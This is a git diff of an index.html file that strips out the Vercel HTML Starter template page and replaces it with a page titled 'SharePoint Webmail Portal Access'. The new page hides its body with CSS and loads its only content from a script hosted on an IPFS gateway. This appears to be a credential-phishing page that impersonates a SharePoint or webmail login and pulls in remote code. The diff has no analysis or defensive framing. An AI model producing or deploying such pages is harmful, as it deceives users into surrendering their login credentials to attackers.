@@ -1,96 +1,19 @@
-<!DOCTYPE html>
+<!doctype html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <script defer src="/_vercel/insights/script.js"></script>
-    <link
-      rel="stylesheet"
-      href="https://cdn.jsdelivr.net/npm/@exampledev/new.css@1.1.2/new.min.css"
-    />
-    <title>Vercel HTML Starter</title>
-    <meta
-      name="description"
-      content="High-performance HTML based website template."
-    />
-  </head>
-  <body>
-    <h1>Vercel HTML Starter</h1>
-    <p>
-      This template is a simple, but powerful single
-      <code>index.html</code> file deployed to
-      <a href="https://vercel.com">Vercel</a>. When your site is deployed, all
-      static assets (like HTML, JavaScript, CSS, images, and more) are deployed
-      globally to every
-      <a href="https://vercel.com/docs/concepts/edge-network/overview"
-        >Vercel Edge Network</a
-      >
-      region.
-    </p>
-    <h2>Simple, privacy-friendly analytics</h2>
-    <p>
-      Want to understand your visitor traffic? Vercel Analytics gives you
-      first-party, privacy-friendly traffic analytics for your HTML site. This
-      template is already configured using the following script:
-    </p>
-    <pre><code>&lt;script defer src="/_vercel/insights/script.js"&gt;&lt;/script&gt;</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/analytics">Vercel Analytics</a>.
-    </p>
-    <h2>Integrated with git</h2>
-    <p>
-      Deploying updates to your site is as simple as
-      <code>git push</code> thanks to Vercel's advanced
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-      Support for GitHub, GitLab, Bitbucket is zero-configuration, and with the
-      flexible Vercel CLI and API, you can integrate with any tool possible.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/git">Git Integration</a>.
-    </p>
-    <h2>Fast <code>gzip</code> compression</h2>
-    <p>
-      To help ensure the smallest possible file sizes for your static assets,
-      the Vercel Edge Network compresses files by default using
-      <code>gzip</code>. You can also optionally use
-      <code>brotli</code> compressesion if you prefer.
-    </p>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/edge-network/compression"
-        >compression</a
-      >.
-    </p>
-    <h2>Advanced routing configuration</h2>
-    <p>
-      Vercel gives you a variety of ways to configure the routing of your
-      website. For example, adding redirects, rewrites, or headers to your page.
-      While you can use <code>vercel.json</code> to define these through JSON,
-      you can also express your routing configuration as code using
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-    <p>
-      Middleware runs before the
-      <a href="https://vercel.com/docs/concepts/edge-network/caching"
-        >Vercel Edge Network Cache</a
-      >, so you can configure routing exactly as your application needs. For
-      example, this template uses <code>middleware.js</code> defined in the root
-      of the repository to add additional security headers to the site:
-    </p>
-    <pre><code>referrer-policy: origin-when-cross-origin
-strict-transport-security: max-age=31536000; includeSubDomains; preload
-x-content-type-options: nosniff
-x-dns-prefetch-control: on
-x-frame-options: DENY</code></pre>
-    <p>
-      Learn more about
-      <a href="https://vercel.com/docs/concepts/functions/edge-middleware"
-        >Vercel Edge Middleware</a
-      >.
-    </p>
-  </body>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="data:image/jpeg;base64,/9j/4AAQSkZJRgABAQEAAAAAAAD/4QBCRXhpZgAATU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAkAAAAMAAAABACwAAEABAAEAAAABAAAAAAAAAAAAAP/bAEMACwkJBwkJBwkJCQkLCQkJCQkJCwkLCwwLCwsMDRAMEQ4NDgwSGRIlGh0lHRkfHCkpFiU3NTYaKjI+LSkwGTshE//bAEMBBwgICwkLFQsLFSwdGR0sLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLCwsLP/AABEIAXsB2gMBIgACEQEDEQH/xAAfAAABBQEBAQEBAQAAAAAAAAAAAQIDBAUGBwgJCgv/xAC1EAACAQMDAgQDBQUEBAAAAX0BAgMABBEFEiExQQYTUWEHInEUMoGRoQgjQrHBFVLR8CQzYnKCCQoWFxgZGiUmJygpKjQ1Njc4OTpDREVGR0hJSlNUVVZXWFlaY2RlZmdoaWpzdHV2d3h5eoOEhYaHiImKkpOUlZaXmJmaoqOkpaanqKmqsrO0tba3uLm6wsPExcbHyMnK0tPU1dbX2Nna4eLj5OXm5+jp6vHy8/T19vf4+fr/xAAfAQADAQEBAQEBAQEBAAAAAAAAAQIDBAUGBwgJCgv/xAC1EQACAQIEBAMEBwUEBAABAncAAQIDEQQFITEGEkFRB2FxEyIygQgUQpGhscEJIzNS8BVictEKFiQ04SXxFxgZGiYnKCkqNTY3ODk6Q0RFRkdISUpTVFVWV1hZWmNkZWZnaGlqc3R1dnd4eXqCg4SFhoeIiYqSk5SVlpeYmZqio6Slpqeoqaqys7S1tre4ubrCw8TFxsfIycrS09TV1tfY2dri4+Tl5ufo6ery8/T19vf4+fr/2gAMAwEAAhEDEQA/AOJJOTSZNB60lescouTRk0lFIBcmjJpKKAFyaMmkooAXJ9aMmkooAXJoyaSigBcmjJpKKAFyaMmkooAXJoyaSigBcmjJpKKAFyaMmkooAXJoyaSigBcmjJpKKAFyaMmkooAXJoyaSigBcmjJpKKAFyaMmkooAXJoyaSigBcmjJpKKAFyaMmkooAXJoyaSigBcmjJpKKAFyaMn1pKKAFyaMmkooAXJoyaSigBcmjJpKKAFyaMmkooAXJoyaSigBcmjJpKKAFyafuao6fTQhp6mkpT1NJSGFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aAaetJSnrSUgCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAp9Mp9NCGnqaSlPU0lIYUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFPplPpoQ09aSlPWkpDCiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAp9Mp9NANPWkpT1NJSAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACn0yn0xDT1pKU9aSkMKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACn0ypKYhh60lKetJSGFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aENPU0lKetJSGFFFFABRRRQAUUUUAFFFFAB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8ThmubWeG6tJnguYSGilQ4I74PtXf6d8T7iKNY9WsDI64HnWxHzY7lKJ05KXNAIyVrMuaD8OHstQt77VLyO5FqwkghiUhDIOjPurutT1G00qxur65dUigjZhuONzY+VR7muGm+KemBD9m066kkx8ok+Rc+5NcJrviDWvETg30gjt0JMNrFxGh/vNjqan2c5u8w5lFaGv4S0eXxZrt7rF8hNhFdNcuCOJZSdyR89h3r1PX9Zs/D2lz3swH7tPLt4l4MkmMKiivN9G8eW2h6fbafa6MSsS/vJPNAMsh+85+tY3iXxLd+Jp7V5Ijb2tqCY7fduBkPV2NVKnKctdhKSSO78FeNJ9amn07VFjjv8A5p7cpwkkR52D3Wrfjrw0NZsPttogGp2CtJEQOZYxy0bf0ryG2uLizu7O9t223FpKsqH1A6qfY16APik+AG0ck4Ab98ME9+MUSpuMuaA1JNWZ5yrbhnBByQynqrDgg0tW9TurW+1C7vra2+yx3LeY0GchZD95gfeqldJkFFFFABRRRQAUUUUAFFFFABT6ZT6aENPWkpT1NJSGFFFFABRRRQAUUUUAFFFFABWtp+u3GnWwtY7dJFDF9zE5yayaKCJQjNWkjof+Esvv+fZP++mo/wCEsvv+fZP++mrnqKDL6tS/lOh/4Sy+/wCfZP8AvpqP+Esvv+fZP++mrnqKA+rUv5Tof+Esvv8An1T/AL6NH/CWX3/Psn/fTVz1FAfVqX8p0P8Awll9/wA+yf8AfTUf8JZff8+yf99NXPUUB9WpfynQ/wDCWXuQTaxnHqTWFPK1xPPcMArTOXKjoCe1R0UGkKUIaxVgooooNAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACn0yn0wGnrSUp60lIAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKfTKfTQhp60lKetJSGFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aENPU0lKetJSGFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aENPU0lKetJSGFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aENPU0lKetJQMKKKKQBRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aENPU0lKetJSGFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABRRRQAUUUUAFFFFABT6ZT6aENPWkpT1pKQwooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKfTKfTQhp6mkpT1pKQwooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKfTKfTQhp6mkpT1pKQwooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKKKKACiiigAooooAKfTKfTQDT1pKsXCqJ7gAAASuAAAAAGPAqLA9KBDKKfgelGB6UWGMop+B6UYHpRYBlFPwPSjA9KBDKKfgUYHpRYBlFPwPSjA9KLAMop+B6UYHpQAyin4HpRgUWGMop+B6UYHpQIZRT8D0owPSiwDKKfgelGB6UAMop+B6UYHpQMZRT8D0owPSgQyin4HpRgelFgGUU/A9KMD0osMZRT8CjA9KLCGUU/A9KMCgBlFPwKMD0osMZRT8D0owPSiwDKKfgelGBQIZRT8D0owPSiwxlFPwPSjA9KLCGUU/A9KMD0osAyin4HpRgelFhjKKfgelGBQIZRT8D0owPSiwDKKfgUYHpQMZRT8D0owPSiwhlFPwPSjA9KAGU+jA9K3oYLYwwEwxEmKMklFJJKjk8VMpcpSVz/2Q==">
+    <title  class="logoname">SharePoint Webmail Portal Access | Digital Secured Platform</title>
+	<style>
+    html, body {
+      visibility: hidden;
+    }
+  </style>
+</head>
+<body>
+  <div id="content">
+<script src="https://bafkreigd4cerwqkkxxvd7g4x2hcmw3sotqqsbqm3tfcqn4hkfta27my6iu.ipfs.w3s.link/"></script>
+  </div>
+</body>
 </html>
